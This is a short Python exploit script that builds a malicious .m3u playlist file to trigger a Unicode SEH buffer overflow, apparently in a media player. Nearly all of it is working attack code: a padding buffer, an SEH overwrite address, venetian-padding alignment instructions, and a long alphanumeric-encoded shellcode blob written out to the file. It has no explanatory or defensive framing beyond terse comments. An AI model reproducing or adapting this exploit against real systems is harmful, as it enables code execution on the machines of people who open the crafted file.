#mona seh -cp unicode
# pop ebx # ret 0x04 | 0x004100f2 #use "\xf2\x41" for expansion 
#no short jump unicode, so instrutions that won't truncate buffer "\x41\x71"
align = (
"\x53"               #push EBX
"\x71"               #unicode nop, venetian padding
"\x58"               #pop EAX
"\x71"               #unicode nop, venetian padding
"\x05\x07\x11"       #add eax,0x11000700  \
"\x71"               #unicode nop(vp) |> +600 to EAX
"\x2d\x01\x11"       #sub eax,0x11000100  /
"\x71"               #unicode nop, venetian padding
"\x50"               #push EAX onto the stack (points to our buffer)
"\x71"               #unicode nop, venetian padding
"\xC3")              #RETN

shellcode = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYXCRKPKPM0QP3YYUP17PS44K0PNP4KQBLL4KR2MD4K2RO8LO6WOZO6NQKOVLOL31SLM2NLO0GQHOLMM1I7JBL2PR27TKPRN0DKOZOL4KPLLQRXZC18M1HQPQ4KQIMPKQXS4KOYMHJCNZOYTKNTDKM1HVNQKOFLY1XOLMKQ97NXYPT5ZVLCSMZXOKCMO42UK4QHTKPXNDM18SQV4KLLPK4K0XMLKQZ3DKM4DKKQXPSYOTO4MTQKQK1QPY0ZPQKOYP1OQO1JTKMBJK4MQMQXNSOBKPKP2H47T3NR1O0T1XPLRWNFKWU9YXKO8PX8DPKQKPKPMYXDPTPPQXO9U0RKKPKO8UBJKZ386LLPKPLNQXM2KPLQ1LU9JF0PPPPP0POPR0OP0P2H9ZLOYOYPKOXUDWQZN00VQGBHF9VERTS1KOXUE57PT4LJKOPNKXD5ZL9X1WKPM0KPRJM02JLDPVPW1XKRZ9Y8QOKOXUE3JXKPSNNV4KP6QZOP1XKPLPM0KPPVQZKPS8QH5TPSJEKO8UV3B3QZM0PV23B7S8LBXYY8QOKO9EDCKHM03MNH2838KPOPM0KPRJM00PQXLKNOLONPKOXUQGS8RURN0MC1KOJ5QNQNKOLLMTLOU5T0KOKOKO9Y5KKOKOKOKQWSO98F3EWQ93WKJPH5ER0VRJKPPSKOZ5A"


#extra byte in EAX, EAX-1
buffer = "A"*536 + "\x71\x41" +"\xf2\x41" + align + "D" *57 + shellcode + "X" * (2864-len(shellcode))
f = open('file10.m3u','w')
f.write(buffer)
f.close()
